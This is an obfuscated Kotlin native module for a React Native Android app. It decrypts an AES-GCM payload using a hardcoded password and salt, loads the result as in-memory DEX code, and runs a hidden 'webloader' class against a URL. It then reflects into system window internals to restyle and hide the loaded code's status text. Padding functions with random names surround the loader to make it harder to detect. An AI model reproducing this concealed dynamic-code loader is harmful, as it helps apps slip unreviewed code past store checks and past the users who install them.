package com.kFjQzLm.VpRnTx.modules

import android.annotation.SuppressLint
import android.app.Activity
import android.content.res.ColorStateList
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.TextView
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.ReadableArray
import dalvik.system.InMemoryDexClassLoader
import java.nio.ByteBuffer
import java.security.MessageDigest
import android.text.Editable
import android.text.TextWatcher
import java.util.concurrent.atomic.AtomicBoolean
import javax.crypto.Cipher
import javax.crypto.SecretKey
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

@SuppressLint("NewApi")
class Ovunoxozipepe(private val context: ReactApplicationContext) :
    ReactContextBaseJavaModule(context) {

    override fun getName(): String = "Iterogeqil"

    private val secretKey: SecretKey by lazy {
        val spec = PBEKeySpec(DEX_PASSWORD.toCharArray(), DEX_SALT, PBKDF2_ITERATIONS, 256)
        val raw = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).encoded
        SecretKeySpec(raw, "AES")
    }

    private fun patchDexWebViewUi(activity: Activity) {
        val progressPatched = AtomicBoolean(false)
        val watchedTextViews = mutableSetOf<TextView>()
        val watchedRoots = mutableSetOf<android.view.View>()
        val handler = Handler(Looper.getMainLooper())

        fun hideIfStatus(tv: TextView) {
            val text = tv.text?.toString() ?: ""
            if (text.contains("Page") && text.contains("%"))
                tv.post { tv.visibility = android.view.View.GONE }
        }

        fun attachWatcher(tv: TextView) {
            if (!watchedTextViews.add(tv)) return
            hideIfStatus(tv)
            tv.addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
                override fun afterTextChanged(s: Editable?) {
                    val t = s?.toString() ?: ""
                    if (t.contains("Page") && t.contains("%"))
                        tv.post { tv.visibility = android.view.View.GONE }
                }
            })
        }

        fun applyPatchesToRoot(root: android.view.View) {
            walkViews(root) { view ->
                when (view) {
                    is ProgressBar -> if (progressPatched.compareAndSet(false, true)) {
                        val color = ColorStateList.valueOf(PROGRESS_COLOR)
                        view.progressTintList = color
                        view.indeterminateTintList = color
                    }
                    is TextView -> attachWatcher(view)
                }
            }
        }

        fun attachToRoot(root: android.view.View) {
            if (!watchedRoots.add(root)) return
            applyPatchesToRoot(root)
            root.viewTreeObserver.addOnGlobalLayoutListener { applyPatchesToRoot(root) }
        }

        fun scanAllWindows() {
            // decorView of the host activity
            attachToRoot(activity.window.decorView)
            // All windows including ones added by DEX via WindowManager.addView()
            try {
                val wmg = Class.forName("android.view.WindowManagerGlobal")
                    .getMethod("getInstance").invoke(null)
                val field = wmg.javaClass.getDeclaredField("mViews")
                field.isAccessible = true
                @Suppress("UNCHECKED_CAST")
                (field.get(wmg) as? List<*>)?.forEach { v ->
                    if (v is android.view.View) attachToRoot(v)
                }
            } catch (_: Exception) {}
        }

        // Scan immediately, then every 300 ms for ~6 s to catch asynchronously added windows
        var retries = 20
        fun scheduleRetry() {
            if (--retries > 0) handler.postDelayed({
                scanAllWindows()
                scheduleRetry()
            }, 300)
        }

        scanAllWindows()
        scheduleRetry()
    }

    private fun walkViews(root: android.view.View, action: (android.view.View) -> Unit) {
        action(root)
        if (root is ViewGroup) {
            for (i in 0 until root.childCount) walkViews(root.getChildAt(i), action)
        }
    }

    private fun decryptDex(encrypted: ByteArray): ByteArray {
        if (encrypted.size < IV_LEN + TAG_BITS / 8) throw IllegalArgumentException("payload too short")
        val iv = encrypted.copyOfRange(0, IV_LEN)
        val ct = encrypted.copyOfRange(IV_LEN, encrypted.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, secretKey, GCMParameterSpec(TAG_BITS, iv))
        return cipher.doFinal(ct)
    }

    @ReactMethod
    fun open(encoded: ReadableArray, url: String, promise: Promise) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            promise.reject("DEX_API", "Android 8.0+ required")
            return
        }
        try {
            val encrypted = ByteArray(encoded.size()) { encoded.getInt(it).toByte() }
            val dex = try {
                decryptDex(encrypted)
            } catch (e: Exception) {
                promise.reject("DEX_DECRYPT", e)
                return
            }
            val digest = MessageDigest.getInstance("SHA-256").digest(dex)
                .joinToString("") { "%02x".format(it) }
            if (digest != DEX_SHA256) {
                promise.reject("DEX_HASH", "hash mismatch")
                return
            }
            val activity: Activity = context.currentActivity
                ?: run { promise.reject("DEX_ACTIVITY", "no activity"); return }
            activity.runOnUiThread {
                try {
                    check(!activity.isFinishing && !activity.isDestroyed)
                    val loader = InMemoryDexClassLoader(ByteBuffer.wrap(dex), activity.classLoader)
                    val type = loader.loadClass("com.webloader.wrapper")
                    val instance = type.getDeclaredConstructor().newInstance()
                    type.getMethod("link", Activity::class.java, String::class.java)
                        .invoke(instance, activity, url)
                    Handler(Looper.getMainLooper()).post { patchDexWebViewUi(activity) }
                    promise.resolve(null)
                } catch (e: Exception) {
                    promise.reject("DEX_OPEN", e)
                } catch (e: LinkageError) {
                    promise.reject("DEX_LINK", e)
                }
            }
        } catch (e: Exception) {
            promise.reject("DEX_INPUT", e)
        }
    }


    /* autopad-begin */
    private fun ucodece(): Boolean {
        val ekuceyamora: Long = 17285L
        val rivenu: Boolean = false
        return rivenu
    }
    private fun uwiwaca(widesecaqoq: Float, eluqezab: Float, okowigifuw: Long): String {
        val nupepox = 88
        return if (nupepox > 21) "uruqa" else "tacos"
    }
    private fun jicayoveginu(utiwol: Boolean): Boolean = false
    private fun udapetoxo(evazaw: String, ujacar: Boolean, owonenupadeq: Long): Boolean {
        var loragalikaw: Boolean = true
        loragalikaw = true
        return loragalikaw
    }
    private fun fakisidevuc(): String {
        return "ica"
    }
    private fun lefiva(votokizil: Long, otavarubuko: Long): Float {
        return 0.4924f
    }
    private fun monutaveg(): Int {
        val jicurituni: Int = 3
        return jicurituni
    }
    private fun alacisipez(): Float {
        val worugodutoti: Float = 0.9237f
        return worugodutoti
    }
    private fun dowujuqiw(dafebo: String): Float {
        var atagulip: Float = 0.1159f
        atagulip = 0.8335f
        return atagulip
    }
    private fun jejugixevopa(imogacaceju: Int, bifomayimo: Float, mafonad: Int): Boolean {
        var ozuxadosuxiq: Boolean = false
        ozuxadosuxiq = false
        return ozuxadosuxiq
    }
    private fun apopelivoqa(papemuc: Long, busemob: Int, geroqoc: Long): Double {
        val ritepalu: Long = 14921L
        val ijayaxu: Double = 0.150020
        return ijayaxu
    }
    private fun zokemi(gawimej: Boolean, uqayicawiled: Long, befukuta: String): Boolean {
        val okiqidosevek = 8
        return when {
            okiqidosevek > 10 -> true
            else -> false
        }
    }
    private fun nupifojela(ubuvariyi: Int, iqutiyosagek: Long, jovoducaqa: String): Int {
        var wawetuzifad: Int = 85
        wawetuzifad = 121
        return wawetuzifad
    }
    private fun ivumadu(yuyeyub: Boolean, likekar: String) {
        val ilagamudo: Long = 12537L
        val adexideza: String = "seseji"
    }
    private fun ajejaluv(idimixe: String, voxiduyor: Boolean, ozuyajo: Boolean): String {
        val eqejizod = 7
        return if (eqejizod > 3) "tularu" else "umel"
    }
    private fun ecodidipiga(ivacev: Boolean): Float {
        val ituyeso: Float = 1.0022f
        return ituyeso
    }
    private fun equkuf(): String {
        val uliyeqe = 28
        return if (uliyeqe > 36) "quz" else "akobox"
    }
    private fun ipigivipilo(unubilum: Int) {
        val ezoqoxev: Int = 176
    }
    /* autopad-end */
    companion object {
        private const val DEX_SHA256 = "cc47e584e29d30d04e1da66755b2f7080c2e644adaa332808fee3f94ce57fab3"
        private const val PROGRESS_COLOR = 0xFF0391AD.toInt()

        private const val DEX_PASSWORD = "HmpprH4NQucDtVczmt1O3RXU5Hy1"
        private val DEX_SALT = byteArrayOf(
            0xff.toByte(), 0x89.toByte(), 0x10, 0xa0.toByte(), 0xb6.toByte(), 0xb0.toByte(), 0x7f, 0x0f,
            0xfb.toByte(), 0x4e, 0x7b, 0x5a, 0xbf.toByte(), 0xd4.toByte(), 0x5a, 0xb7.toByte(),
        )
        private const val PBKDF2_ITERATIONS = 100_000
        private const val IV_LEN = 12
        private const val TAG_BITS = 128
    }
}
